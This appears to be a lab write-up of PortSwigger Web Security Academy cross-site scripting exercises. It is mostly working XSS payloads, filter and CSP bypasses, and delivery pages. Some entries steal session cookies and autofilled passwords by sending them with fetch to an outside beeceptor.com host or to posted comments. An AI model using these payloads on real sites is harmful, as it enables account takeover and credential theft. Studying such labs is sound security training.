# XSS

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://portswigger.net/web-security/cross-site-scripting/contexts
- https://portswigger.net/research/xss-without-parentheses-and-semi-colons

## Reflected XSS into HTML context with nothing encoded

```
?search=<script>alert(document.domain)</script>
```

## Stored XSS into HTML context with nothing encoded

In the leaving post commet functionality, the comment body is vulnerable:

```
<script>alert(document.domain)</script>Comment
```

## DOM XSS in document.write sink using source location.search

```
?search="+onload%3Dalert%28document.domain%29+x%3D"  // Without encoding: " onload=alert(document.domain) x="
```

## DOM XSS in innerHTML sink using source location.search

```
?search=<img+src%3D"X"+onerror%3Dalert%28document.domain%29>  // Without encoding: <img src="X" onerror=alert(document.domain)>
```

## DOM XSS in jQuery anchor href attribute sink using location.search source

```
/feedback?returnPath=javascript:alert(document.cookie)
```

## DOM XSS in jQuery selector sink using a hashchange event

On appending to URL this payload the XSS triggers via creating provided `img` element by jQuery handler `$()`:
```
#<img src=X onerror=print()>
```

Deliver to victim:
```
<iframe src='https://0a0d00c00320c7a8868f0d22007000ee.web-security-academy.net/#' onload="this.src+='<img src=X onerror=print()>'"></iframe>
```

## Reflected XSS into attribute with angle brackets HTML-encoded

```
?search=" autofocus onfocus=alert(document.domain) x="
```

## Stored XSS into anchor href attribute with double quotes HTML-encoded

Create a post with `Website` parameter equal to:
```
javascript:alert(document.domain)
```
or to:
```
javascript:print()
```
It is injected into `href` tag later

## Reflected XSS into a JavaScript string with angle brackets HTML encoded

Characters `'` are not encoded by 
```
?search='; alert(1); var x='
```

## DOM XSS in document.write sink using source location.search inside a select element

```
/product?productId=2&storeId=</option></select><img src=X onerror=alert(1)>
```

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`ng-app` attr in body

Search for `{{2+2}}` retrieves with `{{2+2}}` in page source, but on website is visible as `4`, because of `ng-app` which executes this.

```
{{$on.constructor('alert(1)')()}}

{{$eval.constructor('alert(1)')()}}
```

The only thing we care about is to get to `Function` constructor, create function with it and call it. Since `$eval` and `$on` are functions in scope of angular we can use them.

## Reflected DOM XSS

Search:
```
\"}; alert(1); // -
```

Search term is passed with result to eval function

## Stored DOM XSS

Escaping function:
```
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

Testing this:
```
"<><><>".replace('<', '&lt;').replace('>', '&gt;')
```

Results in:
```
"&lt;&gt;<><>"
```

Create a comment with body:
```
<><img src=X onerror=alert(document.domain)>
```

## Reflected XSS into HTML context with most tags and attributes blocked

Fuzz all posiible tags, to test which one could be used. `<body>` and custom tags (like for eg. `<xss>`) are accepted.

Fuzz all possible events. `onresize` is accepted.

It turns out that new body is not injected, but the main one inherits the attributes of the new one. So searching for `<body onresize=print()></body>` will add `onresize=print()` to main body.

Deliver with body:
```
<iframe src=https://0ac9008903e8dd708000c1ac00020078.web-security-academy.net/?search=%3cbody+onresize%3dprint()%3e%3c%2fbody%3e onload=this.style.width="100px"></iframe>
```

## Reflected XSS into HTML context with all tags blocked except custom ones

XSS with custom tag:
```
<xss autofocus tabindex=1 onfocusin=alert(document.cookie) style="display: block">a</xss>
```

Deliver body:
```
<script>
    location = "https://0a66005c0464b19d8b41541a007d004d.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocusin%3Dalert%28document.cookie%29+style%3D%22display%3A+block%22%3Ea%3C%2Fxss%3E"
</script>
```

## Reflected XSS with some SVG markup allowed

Fuzz all posiible tags, to test which one could be used. `<svg>`, `<animatetransform>`, `<title>`, `<image>` are accepted.

Fuzz all possible events for `<svg><animatetransform>`. `onbegin` is accepted.

Payload
```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

## Reflected XSS in canonical link tag

On adding `?'accesskey='x'onclick='alert(1)` to the URL, the canonical link reflects this change:
```
<link rel="canonical" href='https://0a4c00fe04e52b82813cdf9400c1005e.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```

This will cause to trigger `onclick` event on `Chrome` when shortcut are applied:
 - On Windows: `ALT+SHIFT+X`
 - On MacOS: `CTRL+ALT+X`
 - On Linux: `Alt+X`

## Reflected XSS into a JavaScript string with single quote and backslash escaped

Entering `</script>` breaks the original `<script>` tag.

Final payload:
```
</script><script>alert(document.domain)</script>
```

## Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

`\` are not escaped, but `'` are. So injecting `\'` turns into `\\'` which lets us escape the sctring in `<script>` context

```
\';alert(1)//
```

## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.

Content of onclick event is URL decoded on run, so string can be scaped using `&apos;`

```
http://JKDSFKDSF_WEBSITE&apos;); alert(1); //
```

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

Check what values are geting encoded:
```
JKSDFHSUD_SEARCH { } $ & - / \ ' " - +
```

`${2+2}` results in `4` because the injected payload is in js string template.

```
${alert(1)}
```

## Exploiting cross-site scripting to steal cookies

Comment body is vuln to XSS.

First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used]

```
<script>
    fetch('https://aaaaaa.free.beeceptor.com?q=' + document.cookie, {mode: 'no-cors'})
</script>
```

Alternative solution. Create comment with body:
```
<script>
window.addEventListener("load", ()=>{
    var csrf = document.querySelector("form input[name='csrf']").value;
    fetch("https://0a0500a9039dbb1a8057b2d0001d00ed.web-security-academy.net/post/comment", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: 'csrf='+csrf+'&postId=1&comment='+encodeURIComponent(btoa(document.cookie))+'&name=Admin&email=email@email.com&website=http://example.com'
    })
}) 
</script>
```

Then read the token of impersonated user from `postId = 1`

## Exploiting cross-site scripting to capture passwords

The goal here is to steal password that will be autofilled by browser / password managers in this website.

First solution using https://beeceptor.com/ (blocked by Burp WAF probably)
[NOTE FROM THE FUTURE: Maybe Exploit Server with Access logs could have been used] 

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://bbbbbb.free.beeceptor.com?q=' + username.value+':'+this.value,{
method:'GET',
mode: 'no-cors',
});">
```

(`mode: 'no-cors'` limits possible headers which will be added to the request and may not allow accessing the response value)

Alternative solution. Create comment with body:

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://0afa00a0040eb1438c49639400ff00d8.web-security-academy.net/post/comment', {
method: 'POST',
headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
},
body: 'csrf='+document.querySelector('form input[name=\'csrf\']').value+'&postId=1&comment='+encodeURIComponent(btoa(username.value+'~'+this.value))+'&name=Admin&email=email@email.com&website=http://example.com'
});">
```

Then read the username and password of impersonated user from `postId = 1`

## Exploiting XSS to perform CSRF

```
<script>
window.addEventListener("load", ()=>{
    var csrf = document.querySelector("form input[name='csrf']").value;
    fetch("https://0a5b0051036b221b80115357002200c1.web-security-academy.net/my-account/change-email", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: 'csrf='+csrf+'&email=email@email.com'
    })
}) 
</script>
```

## Reflected XSS with AngularJS sandbox escape without strings

Searching for `nsteng9k1'"<>&()` string returns us the page with text `0 search results for {{value}}` and a js code containing our encoded payload `nsteng9k1&apos;&quot;&lt;&gt;&()` that then would process it and change the value on the website. With further testing we can notice, that `&{}()[]|:;` are not html encoded in the response.

Our reflected input is passed to the `$parse` function like this `$parse("search")({"search": <our input>})` which sets the value of param named `value` replacing then the contents of the page.

We cannot pass `{{1+2}}` or simply `1+2` to invoke tamplate injection. Additionally the search term have max of 10 character, however any other query param will be accepted and the last one will be rendered to the page: `search=a&test=bbb` will result in `bbb` rendered on the page and passed to `$parse` seperately.

With help from the solution `?search=a&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` this solves the lab:

"The exploit uses toString() to create a string without using quotes. It then gets the String prototype and overwrites the charAt function for every string. This effectively breaks the AngularJS sandbox. Next, an array is passed to the orderBy filter. We then set the argument for the filter by again using toString() to create a string and the String constructor property. Finally, we use the fromCharCode method generate our payload by converting character codes into the string x=alert(1). Because the charAt function has been overwritten, AngularJS will allow this code where normally it would not."

## Reflected XSS with AngularJS sandbox escape and CSP

It appears that we have no html encoding, but tries like `<img src="X" onerror=alert(1)/>` results in an error: `Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.`

This time providing payload `{{2+2}}` results in `{{2+2}}` in the response and `4` being rendered on the page.

`{{ 'a'.constructor.prototype.charAt=[].join; $eval(1+2) }}`

Tries to bypass the CSP:
 - `{{ 'a'.constructor.prototype.charAt=[].join;$eval('alert(1)') }}` - browser crash multiple times
 - `{{ [1].map(alert) }}` - undefined not a function error
 - `{{ [1].filter(alert) }}` - error
 - `{{ [1].forEach(alert) }}` - error

All resulted with `undefined is not a function at Array.map`

According to solution this solves the lab:

```
<script>
location='https://0ae8004e034593d7814fbbc900fc0000.web-security-academy.net//?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>
```

"The exploit uses the ng-focus event in AngularJS to create a focus event that bypasses CSP. It also uses $event, which is an AngularJS variable that references the event object. The path property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the window object.

Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check."

## Reflected XSS with event handlers and href attributes blocked

Performing search for `<>";()'{}[]/\` results in the same reflected on the page response, without html encoding.

Most of the tags are unfortunately blocked and sending them as payload results in 400. Payloads are not case sensitive, tries like `<ScRiPt>` are also cought. By running the below command we can check which are available:

```
ffuf -w tags.txt -u 'https://0ad700a303b7a4c0839c4d4700460031.web-security-academy.net/?search=<FUZZ' -x 'http://127.0.0.1:8080' -fc 400
```

From this we can notice that `svg` tag is allowed and manually testing later we can also notice that `svg` with `animate` and `text` is also allowed.

Payload found in cheatsheet after small modifications solved the lab:

```
<svg><a><animate attributeName=href values=javascript:alert(1) /></animate><text x=20 y=20>Click</text></a>
```

## Reflected XSS in a JavaScript URL with some characters blocked

After creating comment with body `<>()'"{}[]/\` we can notice html encoding for most of the characters, resulting in `&lt;&gt;()&apos;&quot;{}[]/\\`.

We can notice `fetch` function used for analytics and the url being reflected there. Upon entering the same site with new param containing quotes `/post?postId=2&x=<>()'"{}[]/\`, we discover that in this place they are not being html encoded, but URL encoded.

Accessing `/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'` and clicking Back button solves the lab.

"The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler.

As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window."

Contents of the tags are being html decoded when run, but as it turns out, the content of the `href` with usage of `javascript:` pseudo-schema performs url decoding before running. Here the problem was that spaces were encoded as `+` signs, so in order to solve this `/**/` trick was required.
